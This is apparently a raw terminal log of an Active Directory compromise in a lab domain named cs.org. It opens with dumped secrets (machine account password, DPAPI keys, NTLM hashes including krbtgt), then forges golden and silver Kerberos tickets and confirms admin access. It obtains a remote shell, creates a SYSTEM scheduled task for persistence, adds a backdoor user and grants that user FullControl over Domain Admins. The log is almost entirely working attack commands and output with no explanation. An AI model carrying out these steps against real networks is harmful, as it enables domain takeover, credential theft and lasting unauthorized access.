+cs\DC01$:plain_password_hex:f9584a10a8963b502b6b39de63b660878f0934b7a5436e6086751f825d44ee2d199065f1860c210c9e78b64d368035bbaaedfc172e2a0b95dece1dc3e7c9e48ae5326697b5e889cfc114873f21d83c53dfd5e7f5a2df623bd90ed66c64e50a84ef1149c56d4d4703ed679e093b52740ab37d9d02abbbf04e482102079a4dec60a288d9c1806d6320b9cdf284e0ae3810c3535735424a0b243f151ae1c880027238c5de46d2f9862fae540cfa11a7abaa701fb90cf36e531e40862607156bb377dd7322868af134609e2b3d9ebe4076f9123ecc1a78e8b0cf32526c3cda394c7b03a08453ece98d303c319001b3d8b8b9
+cs\DC01$:aad3b435b51404eeaad3b435b51404ee:35e8bf6d49a50038e4d3c7ba8dcba481:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xc1df8df29beb4cff75656e42630c4117f1c43df9
+dpapi_userkey:0x7d4fca12ee838ee5076603e375dd2f912d588ca1
+[*] NL$KM 
+ 0000   61 E6 F9 DA A4 6B BB AC  57 AF 94 BD 49 C7 D3 4E   a....k..W...I..N
+ 0010   4C D6 01 9C 50 D0 4F F8  FE 6D C8 4E 52 CE 48 B1   L...P.O..m.NR.H.
+ 0020   B4 75 B9 2C 5E A0 32 4A  62 79 F0 A2 55 A0 C2 A1   .u.,^.2Jby..U...
+ 0030   79 A5 A3 78 37 C1 1F F4  96 1C FA 12 76 A4 5B 79   y..x7.......v.[y
+NL$KM:61e6f9daa46bbbac57af94bd49c7d34e4cd6019c50d04ff8fe6dc84e52ce48b1b475b92c5ea0324a6279f0a255a0c2a179a5a37837c11ff4961cfa1276a45b79
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:671033c111b0bbc33562674998092db3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:756d9c4cf4af8bc68e74967b580bebb4:::
+cs.org\manya.lilllie:1103:aad3b435b51404eeaad3b435b51404ee:bfa16f7dc6d7189ac29481b87f606e54:::
+cs.org\avis.charmine:1104:aad3b435b51404eeaad3b435b51404ee:fc5956ecab667ea3f6eafb5360e782cc:::
+cs.org\gratia.khalil:1105:aad3b435b51404eeaad3b435b51404ee:36f341dfe2b1fa01e0c63dc09184bdfd:::
+cs.org\cass.lorelle:1106:aad3b435b51404eeaad3b435b51404ee:b8ea5c074b2116f19a420a1c1b33bc9a:::
+cs.org\electra.amalia:1107:aad3b435b51404eeaad3b435b51404ee:24e80008e5d5f8fb1b642f7add45a8b9:::
+cs.org\georgina.jennie:1108:aad3b435b51404eeaad3b435b51404ee:f345eeebaedd763d28dfb4c58df366ba:::
+cs.org\pepi.allyn:1109:aad3b435b51404eeaad3b435b51404ee:fd5527aaafb89c2f81cd039f0a593496:::
+cs.org\ronni.octavia:1110:aad3b435b51404eeaad3b435b51404ee:610d852bf57707bbe315de101add77ab:::
+cs.org\amye.nicolea:1111:aad3b435b51404eeaad3b435b51404ee:55bdea05acf973920b198c6c97db924e:::
+
+
+
+
+
+
+❯ ticketer.py \
+  -nthash '756d9c4cf4af8bc68e74967b580bebb4' \
+  -domain-sid 'S-1-5-21-79771789-2455041398-3787107133' \
+  -domain 'CS.ORG' \
+  Administrator
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for CS.ORG/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving/Updating ticket in Administrator.ccache
+❯ export KRB5CCNAME="$PWD/Administrator.ccache"
+❯ nxc smb DC01.cs.org -k --use-kcache
+SMB         DC01.cs.org     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         DC01.cs.org     445    DC01             [+] CS.ORG\Administrator from ccache (Pwn3d!)
+ 
+
+
+
+
+❯ ticketer.py \
+  -nthash '35e8bf6d49a50038e4d3c7ba8dcba481' \
+  -domain-sid 'S-1-5-21-79771789-2455041398-3787107133' \
+  -domain 'CS.ORG' \
+  -spn 'cifs/DC01.cs.org' \
+  silver
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for CS.ORG/silver
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving/Updating ticket in silver.ccache
+❯ export KRB5CCNAME="$PWD/silver.ccache"
+❯ nxc smb DC01.cs.org -k --use-kcache
+SMB         DC01.cs.org     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:cs.org) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         DC01.cs.org     445    DC01             [+] CS.ORG\silver from ccache (Pwn3d!)
+
+~/Desktop/DEPI/Domain_2/vulen AD ❯ 
+
+
+
+
+❯ wmiexec.py -k -no-pass \
+  -dc-ip 192.168.56.10 \
+  'CS.ORG/Administrator@DC01.cs.org'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>schtasks /Create /TN "Persistence-Test" /TR "cmd.exe /c whoami > C:\persistence-test.txt" /SC ONLOGON /RU SYSTEM
+SUCCESS: The scheduled task "Persistence-Test" has successfully been created.
+
+C:\>schtasks /Query /TN "Persistence-Test"
+
+Folder: \
+TaskName                                 Next Run Time          Status         
+======================================== ====================== ===============
+Persistence-Test                         N/A                    Ready          
+
+
+
+
+❯ python bloodyAD.py \
+  --host DC01.cs.org \
+  -d CS.ORG \
+  -k ccache="$PWD/Administrator.ccache" \
+  add user persist.user 'P@ssw0rd123!'
+[+] persist.user created
+
+
+
+
+Valid starting       Expires              Service principal
+2026-09-29T18:59:33  2036-09-26T18:59:33  krbtgt/CS.ORG@CS.ORG
+	renew until 2036-09-26T18:59:33
+❯ dacledit.py \
+    -k -no-pass \
+    -dc-ip 192.168.56.10 \
+    -principal persist.user \
+    -target "Domain Admins" \
+    -action write \
+    -rights FullControl \
+    CS.ORG/Administrator
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+/home/eyad/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20260929-192750.bak
+[*] DACL modified successfully!
+❯ dacledit.py \
+    -k -no-pass \
+    -dc-ip 192.168.56.10 \
+    -principal persist.user \
+    -target "Domain Admins" \
+    -action read \
+    CS.ORG/Administrator
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Parsing DACL
+[*] Printing parsed DACL
+[*] Filtering results for SID (S-1-5-21-79771789-2455041398-3787107133-1214)
+[*]   ACE[21] info                
+[*]     ACE Type                  : ACCESS_ALLOWED_ACE
+[*]     ACE flags                 : None
+[*]     Access mask               : FullControl (0xf01ff)
+[*]     Trustee (SID)             : persist.user (S-1-5-21-79771789-2455041398-3787107133-1214)
